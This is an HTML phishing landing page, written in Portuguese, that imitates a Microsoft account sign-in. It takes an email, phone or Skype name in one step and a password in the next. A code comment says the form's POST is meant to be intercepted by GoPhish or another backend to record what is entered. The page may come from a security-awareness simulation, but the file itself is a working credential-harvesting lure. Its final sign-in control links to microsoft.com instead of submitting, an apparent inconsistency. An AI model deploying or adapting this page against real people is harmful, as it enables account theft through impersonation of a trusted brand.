<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar na sua conta</title>
<style>
  * {
    box-sizing: border-box;
  }

  html, body {
    height: 100%;
    margin: 0;
    font-family: 'Segoe UI', 'Segoe UI Web', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
  }

  body {
    display: flex;
    align-items: center;
    justify-content: center;
    background: #e9ebf5;
    position: relative;
    overflow: hidden;
  }

  /* Background decorative shapes, mimicking the abstract wave/geometric MS background */
  .bg {
    position: absolute;
    inset: 0;
    z-index: 0;
    background:
      radial-gradient(circle at 15% 75%, rgba(255,255,255,0.6), transparent 40%),
      radial-gradient(circle at 85% 20%, rgba(255,255,255,0.5), transparent 45%),
      linear-gradient(135deg, #eef0f7 0%, #e3e6f3 50%, #eceef7 100%);
  }

  .bg svg {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
  }

  .container {
    position: relative;
    z-index: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .card {
    background: #ffffff;
    width: 440px;
    max-width: 92vw;
    padding: 44px 44px 36px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 25px 55px rgba(0,0,0,0.08);
    border-radius: 2px;
  }

  .card h1 {
    font-size: 24px;
    font-weight: 600;
    color: #1b1b1b;
    margin: 0 0 24px 0;
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 28px;
  }

  .logo .logo-mark {
    width: 28px;
    height: 28px;
    display: grid;
    grid-template-columns: 1fr 1fr;
    grid-template-rows: 1fr 1fr;
    gap: 2px;
    flex-shrink: 0;
  }

  .logo .logo-mark span {
    display: block;
  }

  .logo .logo-mark span:nth-child(1) { background: #4a6cf7; }
  .logo .logo-mark span:nth-child(2) { background: #7c5cff; }
  .logo .logo-mark span:nth-child(3) { background: #22c1a4; }
  .logo .logo-mark span:nth-child(4) { background: #ffb648; }

  .logo .logo-text {
    font-size: 17px;
    font-weight: 600;
    color: #1b1b1b;
  }

  .field {
    margin-bottom: 4px;
  }

  .field input {
    width: 100%;
    font-size: 15px;
    padding: 6px 1px 9px;
    border: none;
    border-bottom: 1px solid #666666;
    outline: none;
    color: #1b1b1b;
    background: transparent;
  }

  .field input::placeholder {
    color: #666666;
  }

  .field input:focus {
    border-bottom: 2px solid #0067b8;
    padding-bottom: 8px;
  }

  .links {
    margin-top: 18px;
    font-size: 13.5px;
    color: #1b1b1b;
  }

  .links p {
    margin: 0 0 8px 0;
  }

  .links a {
    color: #0067b8;
    text-decoration: none;
  }

  .links a:hover {
    text-decoration: underline;
  }

  .actions {
    margin-top: 40px;
    display: flex;
    justify-content: flex-end;
    gap: 12px;
  }

  .btn {
    min-width: 108px;
    padding: 10px 24px;
    font-size: 15px;
    border: none;
    cursor: pointer;
    border-radius: 0;
  }

  .btn-secondary {
    background: #e0e0e0;
    color: #1b1b1b;
  }

  .btn-secondary:hover {
    background: #d3d3d3;
  }

  .btn-primary {
    background: #0067b8;
    color: #ffffff;
    font-weight: 600;
  }

  .btn-primary:hover {
    background: #005ea6;
  }

  .signin-options {
    background: #ffffff;
    width: 440px;
    max-width: 92vw;
    margin-top: 1px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 10px 30px rgba(0,0,0,0.06);
    border-radius: 2px;
    padding: 16px 44px;
    display: flex;
    align-items: center;
    gap: 14px;
    cursor: pointer;
    font-size: 15px;
    color: #1b1b1b;
  }

  .signin-options:hover {
    background: #f5f5f5;
  }

  .signin-options svg {
    width: 22px;
    height: 22px;
    flex-shrink: 0;
  }

  .footer {
    position: fixed;
    bottom: 14px;
    right: 24px;
    display: flex;
    gap: 24px;
    font-size: 12.5px;
    color: #1b1b1b;
    z-index: 2;
  }

  .footer a {
    color: #1b1b1b;
    text-decoration: none;
  }

  .footer a:hover {
    text-decoration: underline;
  }

  .footer .dots {
    cursor: pointer;
    letter-spacing: 1px;
  }

  .step {
    display: none;
  }

  .step.active {
    display: block;
  }

  .account-chip {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 24px;
  }

  .account-chip .avatar {
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background: #5b5b5b;
    color: #ffffff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: 600;
    flex-shrink: 0;
  }

  .account-chip .email {
    font-size: 15px;
    color: #1b1b1b;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  .change-account {
    margin: -14px 0 20px 0;
  }

  .change-account a {
    font-size: 13.5px;
    color: #0067b8;
    text-decoration: none;
  }

  .change-account a:hover {
    text-decoration: underline;
  }

  .password-field {
    position: relative;
  }

  .password-field input {
    padding-right: 36px;
  }

  .toggle-visibility {
    position: absolute;
    right: 2px;
    top: 4px;
    background: none;
    border: none;
    cursor: pointer;
    padding: 4px;
    color: #5e5e5e;
  }

  .toggle-visibility svg {
    width: 20px;
    height: 20px;
    display: block;
  }

  .error-msg {
    display: none;
    align-items: flex-start;
    gap: 8px;
    margin-top: 10px;
    font-size: 13px;
    color: #a4262c;
  }

  .error-msg.show {
    display: flex;
  }

  .error-msg svg {
    width: 14px;
    height: 14px;
    flex-shrink: 0;
    margin-top: 2px;
  }

  .keep-signed-in {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-top: 22px;
    font-size: 15px;
    color: #1b1b1b;
  }

  .keep-signed-in input {
    width: 16px;
    height: 16px;
    accent-color: #0067b8;
    cursor: pointer;
  }

  .field input.invalid {
    border-bottom: 1px solid #a4262c;
  }
</style>
</head>
<body>

  <div class="bg">
    <svg viewBox="0 0 1854 941" preserveAspectRatio="xMidYMid slice">
      <polyline points="0,300 400,150 900,280 1400,120 1854,260" fill="none" stroke="#ffffff" stroke-opacity="0.5" stroke-width="1.5"/>
      <polyline points="0,500 300,420 700,520 1200,380 1854,480" fill="none" stroke="#c7cdea" stroke-opacity="0.4" stroke-width="1.5"/>
      <polygon points="0,941 250,700 500,941" fill="#ffffff" fill-opacity="0.25"/>
      <polygon points="1854,941 1600,650 1300,941" fill="#dfe3f5" fill-opacity="0.35"/>
    </svg>
  </div>

  <div class="container">
    <form class="card" id="login-form" method="POST" action="">

      <!-- Passo 1: email -->
      <div class="step active" id="step-email">
        <div class="logo">
    <!-- Marca do Logo (Grid 2x2) -->
   <img src="pngwing.com.png" alt="Logotipo" width="164" height="55">
    <!-- Texto do Logo -->
</div>
        <h1>Entrar</h1>
        <div class="field">
          <input type="text" id="email-input" name="username" placeholder="Email, telefone ou Skype" autocomplete="username">
        </div>
        <div class="error-msg" id="email-error">
          <svg viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="8" r="8"/><rect x="7.1" y="3.5" width="1.8" height="6" fill="#fff"/><rect x="7.1" y="10.5" width="1.8" height="1.8" fill="#fff"/></svg>
          <span>Insira um email, telefone ou Skype válido.</span>
        </div>
        <div class="links">
          <p>Não tem uma conta? <a href="#">Crie uma!</a></p>
          <p><a href="#">Não consegue acessar sua conta?</a></p>
        </div>
        <div class="actions">
          <button class="btn btn-secondary" type="button">Voltar</button>
          <button class="btn btn-primary" type="button" id="next-btn">Avançar</button>
        </div>
      </div>

      <!-- Passo 2: senha -->
      <div class="step" id="step-password">
        <div class="logo">
          <img src="pngwing.com.png" alt="Logotipo" width="164" height="55">
        </div>
        <h1>Digite a senha</h1>
        <div class="account-chip">
          <div class="avatar" id="avatar-initial">U</div>
          <div class="email" id="account-email">usuario@exemplo.com</div>
        </div>
        <div class="change-account">
          <a href="#" id="change-account-link">Usar outra conta</a>
        </div>
        <div class="field password-field">
          <input type="password" id="password-input" name="password" placeholder="Senha">
          <button type="button" class="toggle-visibility" id="toggle-password" aria-label="Mostrar senha">
            <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
          </button>
        </div>
        <div class="error-msg" id="password-error">
          <svg viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="8" r="8"/><rect x="7.1" y="3.5" width="1.8" height="6" fill="#fff"/><rect x="7.1" y="10.5" width="1.8" height="1.8" fill="#fff"/></svg>
          <span>Digite a senha da sua conta.</span>
        </div>
        <div class="links">
          <p><a href="#">Esqueceu a senha?</a></p>
        </div>
        <label class="keep-signed-in">
          <input type="checkbox" checked>
          Mantenha-me conectado
        </label>
      <div class="actions" style="display: flex; justify-content: right; gap: 12px;">
  <button class="btn btn-secondary" type="button" id="back-btn">Voltar</button>
  <a href="https://www.microsoft.com/pt-br" class="btn btn-primary" id="signin-btn" style="display: inline-flex; align-items: center; justify-content: center; text-decoration: none;">Entrar</a>
</div>
      </div>

    </form>

    <div class="signin-options">
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="10.5" cy="10.5" r="7" stroke="#5e5e5e" stroke-width="1.6"/>
        <line x1="15.8" y1="15.8" x2="21" y2="21" stroke="#5e5e5e" stroke-width="1.6" stroke-linecap="round"/>
        <circle cx="10.5" cy="8.5" r="2" stroke="#5e5e5e" stroke-width="1.3"/>
        <path d="M7 13.5c1-1.2 5-1.2 6 0" stroke="#5e5e5e" stroke-width="1.3" stroke-linecap="round"/>
      </svg>
      <span>Opções de entrada</span>
    </div>
  </div>

  <div class="footer">
    <a href="#">Termos de uso</a>
    <a href="#">Privacidade e cookies</a>
    <span class="dots">•••</span>
  </div>

  <script>
    const stepEmail = document.getElementById('step-email');
    const stepPassword = document.getElementById('step-password');

    const emailInput = document.getElementById('email-input');
    const emailError = document.getElementById('email-error');
    const nextBtn = document.getElementById('next-btn');

    const passwordInput = document.getElementById('password-input');
    const passwordError = document.getElementById('password-error');
    const signinBtn = document.getElementById('signin-btn');
    const backBtn = document.getElementById('back-btn');
    const changeAccountLink = document.getElementById('change-account-link');

    const accountEmail = document.getElementById('account-email');
    const avatarInitial = document.getElementById('avatar-initial');

    const togglePassword = document.getElementById('toggle-password');
    const eyeIcon = document.getElementById('eye-icon');

    // valida algo minimamente parecido com email, telefone ou nome de usuário Skype
    function isValidIdentifier(value) {
      const v = value.trim();
      if (v.length < 3) return false;
      const emailLike = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneLike = /^\+?[0-9\s()-]{6,}$/;
      const skypeLike = /^[a-zA-Z][a-zA-Z0-9._-]{2,}$/;
      return emailLike.test(v) || phoneLike.test(v) || skypeLike.test(v);
    }

    function goToPasswordStep() {
      const value = emailInput.value.trim();

      if (!isValidIdentifier(value)) {
        emailInput.classList.add('invalid');
        emailError.classList.add('show');
        emailInput.focus();
        return;
      }

      emailInput.classList.remove('invalid');
      emailError.classList.remove('show');

      accountEmail.textContent = value;
      avatarInitial.textContent = value.trim().charAt(0).toUpperCase() || 'U';

      stepEmail.classList.remove('active');
      stepPassword.classList.add('active');

      passwordInput.value = '';
      passwordInput.classList.remove('invalid');
      passwordError.classList.remove('show');
      passwordInput.focus();
    }

    function goToEmailStep() {
      stepPassword.classList.remove('active');
      stepEmail.classList.add('active');
      emailInput.focus();
    }

    nextBtn.addEventListener('click', goToPasswordStep);

    emailInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') goToPasswordStep();
    });

    emailInput.addEventListener('input', () => {
      emailInput.classList.remove('invalid');
      emailError.classList.remove('show');
    });

    backBtn.addEventListener('click', goToEmailStep);
    changeAccountLink.addEventListener('click', (e) => {
      e.preventDefault();
      goToEmailStep();
    });

    function trySignIn(e) {
      if (passwordInput.value.length === 0) {
        e.preventDefault();
        passwordInput.classList.add('invalid');
        passwordError.classList.add('show');
        passwordInput.focus();
        return false;
      }
      passwordInput.classList.remove('invalid');
      passwordError.classList.remove('show');
      // Não faz preventDefault aqui: o form segue o fluxo normal de POST,
      // que é o que o GoPhish (ou seu backend) intercepta para registrar o envio.
    }

    document.getElementById('login-form').addEventListener('submit', trySignIn);
    passwordInput.addEventListener('input', () => {
      passwordInput.classList.remove('invalid');
      passwordError.classList.remove('show');
    });

    togglePassword.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      eyeIcon.innerHTML = isPassword
        ? '<path d="M2 2l20 20" stroke-linecap="round"/><path d="M9.9 5.2A11 11 0 0 1 12 5c7 0 11 7 11 7a17.6 17.6 0 0 1-4 4.6M6.3 6.3A17.6 17.6 0 0 0 1 12s4 7 11 7a11 11 0 0 0 5-1.2"/><path d="M9.5 9.5a3 3 0 0 0 4 4"/>'
        : '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>';
      togglePassword.setAttribute('aria-label', isPassword ? 'Ocultar senha' : 'Mostrar senha');
    });
  </script>

</body>
</html>
